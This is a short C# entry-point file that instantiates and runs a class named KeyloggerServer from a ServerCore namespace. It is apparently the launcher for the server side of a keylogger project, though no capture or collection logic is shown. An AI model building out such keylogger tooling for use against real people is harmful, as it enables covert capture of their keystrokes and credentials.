using ServerCore;

class Program
{
    static async Task Main()
    {
        var server = new KeyloggerServer();
        await server.RunAsync(); 
    }
}
